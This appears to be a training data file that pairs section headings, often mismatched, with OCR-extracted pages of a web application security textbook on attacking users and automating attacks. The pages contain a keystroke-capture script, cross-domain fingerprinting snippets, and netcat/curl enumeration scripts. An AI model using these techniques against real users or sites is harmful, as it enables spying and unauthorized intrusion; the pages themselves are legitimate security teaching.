    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 560\n560 Chapter 13 n Attacking Users: Other Techniques\nLogging Keystrokes\nJavaScript can be used to monitor all keys the user presses while the browser\nwindow has the focus, including passwords, private messages, and other per-\nsonal information. The following proof-of-concept script captures all keystrokes\nin Internet Explorer and displays them in the browser’s status bar:\n<script>document.onkeypress = function () {\nwindow.status += String.fromCharCode(window.event.keyCode);\n} </script>\nThese attacks can capture keystrokes only while the frame in which the code is\nrunning has the focus. However, some applications leave themselves vulnerable\nto keylogging when they embed a third-party widget or advertising applet in a\nframe within the application’s own pages. In so-called “reverse strokejacking”\nattacks, malicious code running in a child frame can grab the focus from the top-\nlevel window, since this operation is not prevented by the same-origin policy. The\nmalicious code can capture keystrokes by handling onkeydown events and can\npass the separate onkeypress events to the top-level window. That way, typed\ntext still appears in the top-level window in the normal way. By relinquishing the\nfocus briefl y during pauses in typing, the malicious code can even maintain the\nappearance of a blinking caret in the normal location within the top-level page.\nStealing Browser History and Search Queries\nJavaScript can be used to perform a brute-force exercise to discover third-party\nsites recently visited by the user and queries he has performed on popular search\nengines. This technique was already described in the context of performing a\nbrute-force attack to identify valid anti-CSRF tokens that are in use on a differ-\nent domain. The attack works by dynamically creating hyperlinks for common\nwebsites and search queries and by using the getComputedStyle API to test\nwhether the link is colorized as visited or not visited. A huge list of possible\ntargets can be quickly checked with minimal impact on the user.\nEnumerating Currently Used Applications\nJavaScript can be used to determine whether the user is presently logged in to\nthird-party web applications. Most applications contain protected pages that\ncan be viewed only by logged-in users, such as a My Details page. If an unau-\nthenticated user requests the page, she receives different content, such as an\nerror message or a redirection to the login.\nThis behavior can be leveraged to determine whether a user is logged in to a\nthird-party application by performing a cross-domain script include for a pro-\ntected page and implementing a custom error handler to process scripting errors:\nwindow.onerror = fingerprint;\n<script src=”https://other-app.com/MyDetails.aspx”></script>\ncc1133..iinndddd 556600 88//1199//22001111 1122::1144::0044 PPMM"
  },
  {
    "input": "Attacking Other Network Hosts",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 561\nChapter 13 n Attacking Users: Other Techniques 561\nOf course, whatever state the protected page is in, it contains only HTML,\nso a JavaScript error is thrown. Crucially, the error contains a different line\nnumber and error type, depending on the exact HTML document returned.\nThe attacker can implement an error handler (in the fingerprint function) that\nchecks for the line number and error type that arise when the user is logged\nin. Despite the same-origin restrictions, the attacker’s script can deduce what\nstate the protected page is in.\nHaving determined which popular third-party applications the user is pres-\nently logged in to, the attacker can carry out highly focused cross-site request\nforgery attacks to perform arbitrary actions within those applications in the\nsecurity context of the compromised user.\nPort Scanning\nJavaScript can be used to perform a port scan of hosts on the user’s local net-\nwork or other reachable networks to identify services that may be exploitable.\nIf a user is behind a corporate or home fi rewall, an attacker can reach services\nthat cannot be accessed from the public Internet. If the attacker scans the client\ncomputer’s loopback interface, he may be able to bypass any personal fi rewall\nthe user installed.\nBrowser-based port scanning can use a Java applet to determine the user’s\nIP address (which may be NATed from the public Internet) and therefore infer\nthe likely IP range of the local network. The script can then initiate HTTP con-\nnections to arbitrary hosts and ports to test connectivity. As described, the\nsame-origin policy prevents the script from processing the responses to these\nrequests. However, a trick similar to the one used to detect login status can be\nused to test for network connectivity. Here, the attacker’s script attempts to\ndynamically load and execute a script from each targeted host and port. If a web\nserver is running on that port, it returns HTML or some other content, result-\ning in a JavaScript error that the port-scanning script can detect. Otherwise,\nthe connection attempt times out or returns no data, in which case no error is\nthrown. Hence, despite the same-origin restrictions, the port-scanning script\ncan confi rm connectivity to arbitrary hosts and ports.\nNote that most browsers implement restrictions on the ports that can be\naccessed using HTTP requests, and that ports commonly used by other well-\nknown services, such as port 25 for SMTP, are blocked. Historically, however,\nbugs have existed in browsers that have enabled this restriction to sometimes\nbe circumvented.\nAttacking Other Network Hosts\nFollowing a successful port scan to identify other hosts, a malicious script can\nattempt to fi ngerprint each discovered service and then attack it in various ways.\ncc1133..iinndddd 556611 88//1199//22001111 1122::1144::0055 PPMM"
  },
  {
    "input": "Exploiting Non-HTTP Services",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 562\n562 Chapter 13 n Attacking Users: Other Techniques\nMany web servers contain image fi les located at unique URLs. The following\ncode checks for a specifi c image associated with a popular range of DSL routers:\n<img src=”http://192.168.1.1/hm_icon.gif” onerror=”notNetgear()”>\nIf the function notNetgear is not invoked, the server has been successfully\nfi ngerprinted as a NETGEAR router. The script can then proceed to attack the\nweb server, either by exploiting any known vulnerabilities in the particular\nsoftware or by performing a request forgery attack. In this example, the attacker\ncould attempt to log in to the router with default credentials and reconfi gure\nthe router to open additional ports on its external interface, or expose its admin-\nistrative function to the world. Note that many highly effective attacks of this\nkind require only the ability to issue arbitrary requests, not to process their\nresponses, so they are unaffected by the same-origin policy.\nIn certain situations, an attacker may be able to leverage DNS rebinding tech-\nniques to violate the same-origin policy and actually retrieve content from web\nservers on the local network. These attacks are described later in this chapter.\nExploiting Non-HTTP Services\nGoing beyond attacks against web servers, in some situations it is possible to\nleverage a user’s browser to target non-HTTP services that are accessible from\nthe user’s machine. Provided that the service in question tolerates the HTTP\nheaders that unavoidably come at the start of each request, an attacker can send\narbitrary binary content within the message body to interact with the non-HTTP\nservice. Many network services do in fact tolerate unrecognized input and still\nprocess subsequent input that is well-formed for the protocol in question.\nOne technique for sending an arbitrary message body cross-domain was\ndescribed in Chapter 12, in which an HTML form with the enctype attribute set\nto text/plain was used to send XML content to a vulnerable application. Other\ntechniques for delivering these attacks are described in the following paper:\nwww.ngssoftware.com/research/papers/InterProtocolExploitation.pdf\nSuch interprotocol attacks may be used to perform unauthorized actions on\nthe destination service or to exploit code-level vulnerabilities within that service\nto compromise the targeted server.\nFurthermore, in some situations, behavior in non-HTTP services may actually\nbe exploitable to perform XSS attacks against web applications running on the\nsame server. Such an attack requires the following conditions to be met:\nn The non-HTTP service must be running on a port that is not blocked by\nbrowsers, as described previously.\nn The non-HTTP service must tolerate unexpected HTTP headers sent by\nthe browser, and not just shut down the network connection when this\nhappens. The former is common for many services, particularly those\nthat are text-based.\ncc1133..iinndddd 556622 88//1199//22001111 1122::1144::0055 PPMM"
  },
  {
    "input": "DNS Rebinding",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 563\nChapter 13 n Attacking Users: Other Techniques 563\nn The non-HTTP service must echo part of the request contents in its response,\nsuch as in an error message.\nn The browser must tolerate responses that do not contain valid HTTP\nheaders, and in this situation must process a portion of the response as\nHTML if that is what it contains. This is in fact how all current browsers\nbehave when suitable non-HTTP responses are received, probably for\nbackward-compatibility purposes.\nn The browser must ignore the port number when segregating cross-origin\naccess to cookies. Current browsers are indeed port-agnostic in their\nhandling of cookies.\nGiven these conditions, an attacker can construct an XSS attack targeting the\nnon-HTTP service. The attack involves sending a crafted request, in the URL\nor message body, in the normal way. Script code contained in the requests is\nechoed and executes in the user’s browser. This code can read the user’s cook-\nies for the domain on which the non-HTTP service resides, and transmit these\nto the attacker.\nExploiting Browser Bugs\nIf bugs exist within the user’s browser software or any installed extensions, an\nattacker may be able to exploit these via malicious JavaScript or HTML. In some\ncases, bugs within extensions such as the Java VM have enabled attackers to\nperform two-way binary communication with non-HTTP services on the local\ncomputer or elsewhere. This enables the attacker to exploit vulnerabilities that\nexist within other services identifi ed via port scanning. Many software prod-\nucts (including non-browser-based products) install ActiveX controls that may\ncontain vulnerabilities.\nDNS Rebinding\nDNS rebinding is a technique that can be used to perform a partial breach of\nsame-origin restrictions in some situations, enabling a malicious website to\ninteract with a different domain. The possibility of this attack arises because the\nsegregations in the same-origin policy are based primarily on domain names,\nwhereas the ultimate delivery of HTTP requests involves converting domain\nnames into IP addresses.\nAt a high level, the attack works as follows:\nn The user visits a malicious web page on the attacker’s domain. To retrieve\nthis page, the user’s browser resolves the attacker’s domain name to the\nattacker’s IP address.\nn The attacker’s web page makes Ajax requests back to the attacker’s domain,\nwhich is allowed by the same-origin policy. The attacker uses DNS rebinding\ncc1133..iinndddd 556633 88//1199//22001111 1122::1144::0055 PPMM"
  },
  {
    "input": "Browser Exploitation Frameworks",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 564\n564 Chapter 13 n Attacking Users: Other Techniques\nto cause the browser to resolve the attacker’s domain a second time, and\nthis time the domain name resolves to the IP address of a third-party\napplication, which the attacker is targeting.\nn Subsequent requests to the attacker’s domain name are sent to the tar-\ngeted application. Since these are on the same domain as the attacker’s\noriginal page, the same-origin policy allows the attacker’s script to\nretrieve the contents of the responses from the targeted application\nand send these back to the attacker, possibly on a different attacker-\ncontrolled domain.\nThis attack faces various obstacles, including mechanisms in some browsers\nto continue using a previously resolved IP address, even if the domain has been\nrebound to a different address. Furthermore, the Host header sent by the browser\nusually still refers to the attacker’s domain, not that of the target application,\nwhich may cause problems. Historically, methods have existed by which these\nobstacles can be circumvented on different browsers. In addition to the browser,\nDNS rebinding attacks may be performed against browser extensions and web\nproxies, all of which may behave in different ways.\nNote that in DNS rebinding attacks, requests to the targeted application are\nstill made in the context of the attacker’s domain, as far as the browser is con-\ncerned. Hence, any cookies for the actual domain of the target application are\nnot included in these requests. For this reason, the content that can be retrieved\nfrom the target via DNS rebinding is the same as could be retrieved by anyone\nwho can make direct requests to the target. The technique is primarily of interest,\ntherefore, where other controls are in place to prevent an attacker from directly\ninteracting with the target. For example, a user residing on an organization’s\ninternal networks, which cannot be reached directly from the Internet, can be\nmade to retrieve content from other systems on those networks and transit this\ncontent to the attacker.\nBrowser Exploitation Frameworks\nVarious frameworks have been developed to demonstrate and exploit the variety\nof possible attacks that may be carried out against end users on the Internet.\nThese typically require a JavaScript hook to be placed into the victim’s browser\nvia some vulnerability such as XSS. Once the hook is in place, the browser\ncontacts a server controlled by the attacker. It may poll this server periodically,\nsubmitting data back to the attacker and providing a control channel for receiv-\ning commands from the attacker.\ncc1133..iinndddd 556644 88//1199//22001111 1122::1144::0055 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 565\nChapter 13 n Attacking Users: Other Techniques 565\nNOTE Despite the restrictions imposed by the same-origin policy, various\ntechniques can be used in this situation to allow two-way asynchronous interac-\ntion with the attacker’s server from a script that has been injected into a target\napplication. One simple method is to perform dynamic cross-domain script\nincludes to the attacker’s domain. These requests can both transmit captured\ndata back to the attacker (within the URL query string) and receive instructions\nabout actions that should be performed (within the returned script code).\nHere are some actions that may be carried out within this type of framework:\nn Logging keystrokes and sending these to the attacker\nn Hijacking the user’s session with the vulnerable application\nn Fingerprinting the victim’s browser and exploiting known browser vul-\nnerabilities accordingly\nn Performing port scans of other hosts (which may be on a private network\naccessible by the compromised user browser) and sending the results to\nthe attacker\nn Attacking other web applications accessible via the compromised user’s\nbrowser by forcing the browser to send malicious requests\nn Brute-forcing the user’s browsing history and sending this to the attacker\nOne example of a sophisticated browser exploitation framework is BeEF,\ndeveloped by Wade Alcon, which implements the functionality just described.\nFigure 13-8 shows BeEF capturing information from a compromised user,\nincluding computer details, the URL and page content currently displayed, and\nkeystrokes entered by the user.\nFigure 13-8: Data captured from a compromised user by BeEF\ncc1133..iinndddd 556655 88//1199//22001111 1122::1144::0055 PPMM"
  },
  {
    "input": "Man-in-the-Middle Attacks",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 566\n566 Chapter 13 n Attacking Users: Other Techniques\nFigure 13-9 shows BeEF performing a port scan of the victim user’s own\ncomputer.\nFigure 13-9: BeEF performing a port scan of a compromised user’s computer\nAnother highly functional browser exploitation framework is XSS Shell, pro-\nduced by Ferruh Mavituna. It provides a wide range of functions for manipulating\nzombie hosts compromised via XSS, including capturing keystrokes, clipboard\ncontents, mouse movements, screenshots, and URL history, as well as the injec-\ntion of arbitrary JavaScript commands. It also remains resident within the user’s\nbrowser if she navigates to other pages within the application.\nMan-in-the-Middle Attacks\nEarlier chapters described how a suitably positioned attacker can intercept\nsensitive data, such as passwords and session tokens, if an application uses\nunencrypted HTTP communications. What is more surprising is that some\nserious attacks can still be performed even if an application uses HTTPS for\nall sensitive data and the target user always verifi es that HTTPS is being used\nproperly.\nThese attacks involve an “active” man in the middle. Instead of just passively\nmonitoring another user’s traffi c, this type of attacker also changes some of that\ntraffi c on the fl y. Such an attack is more sophisticated, but it can certainly be\ndelivered in numerous common situations, including public wireless hotspots\nand shared offi ce networks, and by suitably minded governments.\nMany applications use HTTP for nonsensitive content, such as product descrip-\ntions and help pages. If such content makes any script includes using absolute\nURLs, an active man-in-the-middle attack can be used to compromise HTTPS-\nprotected requests on the same domain. For example, an application’s help page\nmay contain the following:\n<script src=”http://wahh-app.com/help.js”></script>\ncc1133..iinndddd 556666 88//1199//22001111 1122::1144::0055 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 567\nChapter 13 n Attacking Users: Other Techniques 567\nThis behavior of using absolute URLs to include scripts over HTTP appears\nin numerous high-profi le applications on the web today. In this situation, an\nactive man-in-the-middle attacker could, of course, modify any HTTP response\nto execute arbitrary script code. However, because the same-origin policy gen-\nerally treats content loaded over HTTP and HTTPS as belonging to different\norigins, this would not enable the attacker to compromise content that is accessed\nusing HTTPS.\nTo overcome this obstacle, the attacker can induce a user to load the same\npage over HTTPS by modifying any HTTP response to cause a redirection or\nby rewriting the targets of links in another response. When the user loads the\nhelp page over HTTPS, her browser performs the specifi ed script include using\nHTTP. Crucially, some browsers do not display any warnings in this situation.\nThe attacker can then return his arbitrary script code in the response for the\nincluded script. This script executes in the context of the HTTPS response,\nallowing the attacker to compromise this and further content that is accessed\nover HTTPS.\nSuppose that the application being targeted does not use plain HTTP for any\ncontent. An attacker can still induce the user to make requests to the target\ndomain using plain HTTP by returning a redirection from an HTTP request\nmade to any other domain. Although the application itself may not even listen\nfor HTTP requests on port 80, the attacker can intercept these induced requests\nand return arbitrary content in response to them. In this situation, various\ntechniques can be used to escalate the compromise into the HTTPS origin for\nthe application’s domain:\nn First, as was described for cookie injection attacks, the attacker can use a\nresponse over plain HTTP to set or update a cookie value that is used in\nHTTPS requests. This can be done even for cookies that were originally\nset over HTTPS and fl agged as secure. If any cookie values are processed\nin an unsafe way by script code running in the HTTPS origin, a cookie\ninjection attack can be used to deliver an XSS exploit via the cookie.\nn Second, as mentioned, some browser extensions do not properly segregate\ncontent loaded over HTTP and HTTPS and effectively treat this as belong-\ning to a single origin. The attacker’s script, returned in a response to an\ninduced HTTP request, can leverage such an extension to read or write\nthe contents of pages that the user accessed using HTTPS.\nThe attacks just described rely on some method of inducing the user to make an\narbitrary HTTP request to the target domain, such as by returning a redirection\nresponse from an HTTP request that the user makes to any other domain. You\nmight think that a security-paranoid user would be safe from this technique.\nSuppose the user accesses only one website at a time and restarts his browser\nbefore accessing each new site. Suppose he logs in to his banking application,\ncc1133..iinndddd 556677 88//1199//22001111 1122::1144::0055 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 568\n568 Chapter 13 n Attacking Users: Other Techniques\nwhich uses pure HTTPS, from a clean new browser. Can he be compromised\nby an active man-in-the-middle attack?\nThe disturbing answer is that yes, he probably can be compromised. Today’s\nbrowsers make numerous plain HTTP requests in the background, regardless\nof which domains the user visits. Common examples include antiphishing lists,\nversion pings, and requests for RSS feeds. An attacker can respond to any of\nthese requests with a redirection to the targeted domain using HTTP. When the\nbrowser silently follows the redirection, one of the attacks already described\ncan be delivered, fi rst to compromise the HTTP origin for the targeted domain,\nand then to escalate this compromise into the HTTPS origin.\nSecurity-paranoid users who need to access sensitive HTTPS-protected content\nvia an untrusted network can (probably) prevent the technique just described\nby setting their browser’s proxy confi guration to use an invalid local port for all\nprotocols other than HTTPS. Even if they do this, they may still need to worry\nabout active attacks against SSL, a topic that is outside the scope of this book.\nSummary\nWe have examined a huge variety of ways in which defects in a web application\nmay leave its users exposed to malicious attack. Many of these vulnerabilities\nare complex to understand and discover and often necessitate an amount of\ninvestigative effort that exceeds their signifi cance as the basis for a worthwhile\nattack. Nevertheless, it is common to fi nd that lurking among a large number\nof uninteresting client-side fl aws is a serious vulnerability that can be leveraged\nto attack the application itself. In many cases, the effort is worth it.\nFurthermore, as awareness of web application security continues to evolve,\ndirect attacks against the server component itself are likely to become less\nstraightforward to discover and execute. Attacks against other users, for better\nor worse, are certainly part of everyone’s future.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. You discover an application function where the contents of a query string\nparameter are inserted into the Location header in an HTTP redirect. What\nthree different types of attacks can this behavior potentially be exploited\nto perform?\n2. What main precondition must exist to enable a CSRF attack against a\nsensitive function of an application?\n3. What three defensive measures can be used to prevent JavaScript hijack-\ning attacks?\ncc1133..iinndddd 556688 88//1199//22001111 1122::1144::0055 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 569\nChapter 13 n Attacking Users: Other Techniques 569\n4. For each of the following technologies, identify the circumstances, if any,\nin which the technology would request /crossdomain.xml to properly\nenforce domain segregation:\n(a) Flash\n(b) Java\n(c) HTML5\n(d) Silverlight\n5. “We’re safe from clickjacking attacks because we don’t use frames.” What,\nif anything, is wrong with this statement?\n6. You identify a persistent XSS vulnerability within the display name cap-\ntion used by an application. This string is only ever displayed to the user\nwho confi gured it, when they are logged in to the application. Describe\nthe steps that an attack would need to perform to compromise another\nuser of the application.\n7. How would you test whether an application allows cross-domain requests\nusingXMLHttpRequest?\n8. Describe three ways in which an attacker might induce a victim to use an\narbitrary cookie.\ncc1133..iinndddd 556699 88//1199//22001111 1122::1144::0055 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 570\ncc1133..iinndddd 557700 88//1199//22001111 1122::1144::0066 PPMM"
  },
  {
    "input": "Chapter 14 Automating Customized Attacks",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 571\nCHAPTER\n14\nAutomating Customized Attacks\nThis chapter does not introduce any new categories of vulnerabilities. Rather, it\nexamines one key element in an effective methodology for hacking web applica-\ntions — the use of automation to strengthen and accelerate customized attacks.\nThe range of techniques involved can be applied throughout the application and\nto every stage of the attack process, from initial mapping to actual exploitation.\nEvery web application is different. Attacking an application effectively involves\nusing various manual procedures and techniques to understand its behavior\nand probe for vulnerabilities. It also entails bringing to bear your experience\nand intuition in an imaginative way. Attacks typically are customized in nature,\ntailored to the particular behavior you have identifi ed and to the specifi c ways in\nwhich the application enables you to interact with and manipulate it. Performing\ncustomized attacks manually can be extremely laborious and is prone to mistakes.\nThe most successful web application hackers take their customized attacks a\nstep further and fi nd ways to automate them to make them easier, faster, and\nmore effective.\nThis chapter describes a proven methodology for automating customized\nattacks. This methodology combines the virtues of human intelligence and\ncomputerized brute force, usually with devastating results. This chapter also\nexamines various potential obstacles that may hinder the use of automation,\nand ways in which these obstacles can be circumvented.\n571\ncc1144..iinndddd 557711 88//1199//22001111 1122::1155::2200 PPMM"
  },
  {
    "input": "Uses for Customized Automation",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 572\n572 Chapter 14 n Automating Customized Attacks\nUses for Customized Automation\nThere are three main situations in which customized automated techniques\ncan be employed to help you attack a web application:\nn Enumerating identifi ers — Most applications use various kinds of names\nand identifi ers to refer to individual items of data and resources, such as\naccount numbers, usernames, and document IDs. You often will need\nto iterate through a large number of potential identifi ers to enumerate\nwhich ones are valid or worthy of further investigation. In this situation,\nyou can use automation in a fully customized way to work through a list\nof possible identifi ers or cycle through the syntactic range of identifi ers\nbelieved to be in use by the application.\nAn example of an attack to enumerate identifi ers would be where an\napplication uses a page number parameter to retrieve specifi c content:\nhttp://mdsec.net/app/ShowPage.ashx?PageNo=10069\nIn the course of browsing through the application, you discover a large\nnumber of valid PageNo values. But to identify every valid value, you\nneed to cycle through the entire range — something you cannot feasibly\ndo manually.\nn Harvesting data — Many kinds of web application vulnerabilities enable\nyou to extract useful or sensitive data from the application using specifi c\ncrafted requests. For example, a personal profi le page may display the\npersonal and banking details of the current user and indicate that user’s\nprivilege level within the application. Through an access control defect,\nyou may be able to view the personal profi le page of any application\nuser — but only one user at a time. Harvesting this data for every user\nmight require thousands of individual requests. Rather than working\nmanually, you can use a customized automated attack to quickly capture\nall this data in a useful form.\nAn example of harvesting useful data would be to extend the enumeration\nattack just described. Instead of simply confi rming which PageNo values\nare valid, your automated attack could extract the contents of the HTML\ntitle tag from each page it retrieves, enabling you to quickly scan the list\nof pages for those that are most interesting.\nn Web application fuzzing — As we have described the practical steps for\ndetecting common web application vulnerabilities, you have seen numer-\nous examples where the best approach to detection is to submit various\ncc1144..iinndddd 557722 88//1199//22001111 1122::1155::2211 PPMM"
  },
  {
    "input": "Enumerating Valid Identifiers",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 573\nChapter 14 n Automating Customized Attacks 573\nunexpected items of data and attack strings and review the application’s\nresponses for any anomalies that indicate that the fl aw may be present. In\na large application, your initial mapping exercises may identify dozens of\ndistinct requests you need to probe, each containing numerous different\nparameters. Testing each case manually would be time-consuming and\nmind-numbing and could leave a large part of the attack surface neglected.\nUsing customized automation, however, you can quickly generate huge\nnumbers of requests containing common attack strings and quickly assess\nthe server’s responses to hone in on interesting cases that merit further\ninvestigation. This technique is often called fuzzing.\nWe will examine in detail each of these three situations and the ways in\nwhich customized automated techniques can be leveraged to vastly enhance\nyour attacks against an application.\nEnumerating Valid Identifi ers\nAs we have described various common vulnerabilities and attack techniques,\nyou have encountered numerous situations in which the application employs\na name or identifi er for some item, and your task as an attacker is to discover\nsome or all of the valid identifi ers in use. Here are some examples of where this\nrequirement can arise:\nn The application’s login function returns informative messages that dis-\nclose whether a failed login was the result of an unrecognized username\nor incorrect password. By iterating through a list of common usernames\nand attempting to log in using each one, you can narrow down the list\nto those that you know to be valid. This list can then be used as the basis\nfor a password-guessing attack.\nn Many applications use identifi ers to refer to individual resources that are\nprocessed within the application, such as document IDs, account numbers,\nemployee numbers, and log entries. Often, the application exposes some\nmeans of confi rming whether a specifi c identifi er is valid. By iterating\nthrough the syntactic range of identifi ers in use, you can obtain a com-\nprehensive list of all these resources.\nn If the session tokens generated by the application can be predicted, you\nmay be able to hijack other users’ sessions simply by extrapolating from a\nseries of tokens issued to you. Depending on the reliability of this process,\nyou may need to test a large number of candidate tokens for each valid\nvalue that is confi rmed.\ncc1144..iinndddd 557733 88//1199//22001111 1122::1155::2211 PPMM"
  },
  {
    "input": "Detecting Hits",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 574\n574 Chapter 14 n Automating Customized Attacks\nThe Basic Approach\nYour fi rst task in formulating a customized automated attack to enumerate\nvalid identifi ers is to locate a request/response pair that has the following\ncharacteristics:\nn The request includes a parameter containing the identifi er you are tar-\ngeting. For example, in a function that displays an application page, the\nrequest might contain the parameter PageNo=10069.\nn The server’s response to this request varies in a systematic way when you\nvary the parameter’s value. For example, if a valid PageNo is requested,\nthe server might return a response containing the specifi ed document’s\ncontents. If an invalid value is requested, it might return a generic error\nmessage.\nHaving located a suitable request/response pair, the basic approach involves\nsubmitting a large number of automated requests to the application, either work-\ning through a list of potential identifi ers, or iterating through the syntactic range\nof identifi ers known to be in use. The application’s responses to these requests\nare monitored for “hits,” indicating that a valid identifi er was submitted.\nDetecting Hits\nThere are numerous attributes of responses in which systematic variations may\nbe detected, and which may therefore provide the basis for an automated attack.\nHTTP Status Code\nMany applications return different status codes in a systematic way, depend-\ning on the values of submitted parameters. The values that are most commonly\nencountered during an attack to enumerate identifi ers are as follows:\nn 200 — The default status code, meaning “OK.”\nn 301 or 302 — A redirection to a different URL.\nn 401 or 403 — The request was not authorized or allowed.\nn 404 — The requested resource was not found.\nn 500 — The server encountered an error when processing the request.\nResponse Length\nIt is common for dynamic application pages to construct responses using a page\ntemplate (which has a fi xed length) and to insert per-response content into this\ntemplate. If the per-response content does not exist or is invalid (such as if an\nincorrect document ID was requested), the application might simply return an\ncc1144..iinndddd 557744 88//1199//22001111 1122::1155::2211 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 575\nChapter 14 n Automating Customized Attacks 575\nempty template. In this situation, the response length is a reliable indicator of\nwhether a valid document ID has been identifi ed.\nIn other situations, different response lengths may point toward the occur-\nrence of an error or the existence of additional functionality. In the authors’\nexperience, the HTTP status code and response length indicators have been\nfound to provide a highly reliable means of identifying anomalous responses\nin the majority of cases.\nResponse Body\nIt is common for the data actually returned by the application to contain literal\nstrings or patterns that can be used to detect hits. For example, when an invalid\ndocument ID is requested, the response might contain the string Invalid docu-\nment ID. In some cases, where the HTTP status code does not vary, and the\noverall response length is changeable due to the inclusion of dynamic content,\nsearching responses for a specifi c string or pattern may be the most reliable\nmeans of identifying hits.\nLocation Header\nIn some cases, the application responds to every request for a particular URL\nwith an HTTP redirection (a 301 or 302 status code), where the target of the\nredirection depends on the parameters submitted in the request. For example,\na request to view a report might result in a redirection to /download.jsp if the\nsupplied report name is correct, or to /error.jsp if it is incorrect. The target\nof an HTTP redirection is specifi ed in the Location header and can often be\nused to identify hits.\nSet-Cookie Header\nOccasionally, the application may respond in an identical way to any set of\nparameters, with the exception that a cookie is set in certain cases. For example,\nevery login request might be met with the same redirection, but in the case of\nvalid credentials, the application sets a cookie containing a session token. The\ncontent that the client receives when it follows the redirect depends on whether\na valid session token is submitted.\nTime Delays\nOccasionally, the actual contents of the server’s response may be identical when\nvalid and invalid parameters are submitted, but the time taken to return the\nresponse may differ subtly. For example, when an invalid username is submitted\nto a login function, the application may respond immediately with a generic,\nuninformative message. However, when a valid username is submitted, the\ncc1144..iinndddd 557755 88//1199//22001111 1122::1155::2211 PPMM"
  },
  {
    "input": "Scripting the Attack",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 576\n576 Chapter 14 n Automating Customized Attacks\napplication may perform various back-end processing to validate the supplied\ncredentials, some of which is computationally intensive, before returning the\nsame message if the credentials are incorrect. If you can detect this time differ-\nence remotely, it can be used as a discriminator to identify hits in your attack.\n(This bug is also often found in other types of software, such as older versions\nof OpenSSH.)\nTIP The primary objective in selecting indicators of hits is to fi nd one that is\ncompletely reliable or a group that is reliable when taken together. However,\nin some attacks, you may not know in advance exactly what a hit looks like.\nFor example, when targeting a login function to try to enumerate usernames,\nyou may not actually possess a known valid username to determine the appli-\ncation’s behavior in the case of a hit. In this situation, the best approach is to\nmonitor the application’s responses for all the attributes just described and to\nlook for any anomalies.\nScripting the Attack\nSuppose that you have identifi ed the following URL, which returns a 200 status\ncode when a valid PageNo value is submitted and a 500 status code otherwise:\nhttp://mdsec.net/app/ShowPage.ashx?PageNo=10069\nThis request/response pair satisfi es the two conditions required for you to\nbe able to mount an automated attack to enumerate valid page IDs.\nIn a simple case such as this, it is possible to create a custom script quickly\nto perform an automated attack. For example, the following bash script reads a\nlist of potential page IDs from standard input, uses the netcat tool to request a\nURL containing each ID, and logs the fi rst line of the server’s response, which\ncontains the HTTP status code:\n#!/bin/bash\nserver=mdsec.net\nport=80\nwhile read id\ndo\necho -ne “$id\\t”\necho -ne “GET/app/ShowPage.ashx?PageNo=$id HTTP/1.0\\r\\nHost: $server\\r\\n\\r\\n”\n| netcat $server $port | head -1\ndone | tee outputfile\ncc1144..iinndddd 557766 88//1199//22001111 1122::1155::2211 PPMM"
  },
  {
    "input": "JAttack",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 577\nChapter 14 n Automating Customized Attacks 577\nRunning this script with a suitable input fi le generates the following output,\nwhich enables you to quickly identify valid page IDs:\n~> ./script <IDs.txt\n10060 HTTP/1.0 500 Internal Server Error\n10061 HTTP/1.0 500 Internal Server Error\n10062 HTTP/1.0 200 Ok\n10063 HTTP/1.0 200 Ok\n10064 HTTP/1.0 500 Internal Server Error\n...\nTIP The Cygwin environment can be used to execute bash scripts on the\nWindows platform. Also, the UnxUtils suite contains Win32 ports of numerous\nuseful GNU utilities such as head and grep.\nYou can achieve the same result just as easily in a Windows batch script. The\nfollowing example uses the curl tool to generate requests and the findstr\ncommand to fi lter the output:\nfor /f “tokens=1” %i in (IDs.txt) do echo %i && curl\nmdsec.net/app/ShowPage.ashx?PageNo=%i -i -s | findstr /B HTTP/1.0\nSimple scripts like these are ideal for performing a straightforward task such\nas cycling through a list of parameter values and parsing the server’s response\nfor a single attribute. However, in many situations you are likely to require\nmore power and fl exibility than command-line scripting can readily offer. The\nauthors’ preference is to use a suitable high-level object-oriented language that\nenables easy manipulation of string-based data and provides accessible APIs\nfor using sockets and SSL. Languages that satisfy these criteria include Java, C#,\nand Python. We will look in more depth at an example using Java.\nJAttack\nJAttack is an example of a simple but versatile tool that demonstrates how anyone\nwith some basic programming knowledge can use customized automation to\ndeliver powerful attacks against an application. The full source code for this tool\ncan be downloaded from this book’s companion website, http://mdsec.net/\nwahh. More important than the actual code, however, are the basic techniques\ninvolved, which we will explain shortly.\nRather than just working with a request as an unstructured block of text, we\nneed a tool to understand the concept of a request parameter. This is a named\ncc1144..iinndddd 557777 88//1199//22001111 1122::1155::2211 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 578\n578 Chapter 14 n Automating Customized Attacks\nitem of data that can be manipulated and that is attached to a request in a par-\nticular way. Request parameters may appear in the URL query string, HTTP\ncookies, or the body of a POST request. Let’s start by creating a Param class to\nhold the relevant details:\n// JAttack.java\n// by Dafydd Stuttard\nimport java.net.*;\nimport java.io.*;\nclass Param\n{\nString name, value;\nType type;\nboolean attack;\nParam(String name, String value, Type type, boolean attack)\n{\nthis.name = name;\nthis.value = value;\nthis.type = type;\nthis.attack = attack;\n}\nenum Type\n{\nURL, COOKIE, BODY\n}\n}\nIn many situations, a request contains parameters that we don’t want to modify\nin a given attack, but that we still need to include for the attack to succeed. We\ncan use the “attack” fi eld to fl ag whether a given parameter is being subjected\nto modifi cation in the current attack.\nTo modify the value of a selected parameter in crafted ways, we need our tool\nto understand the concept of an attack payload. In different types of attacks,\nwe need to create different payload sources. Let’s build some fl exibility into the\ntool up front and create an interface that all payload sources must 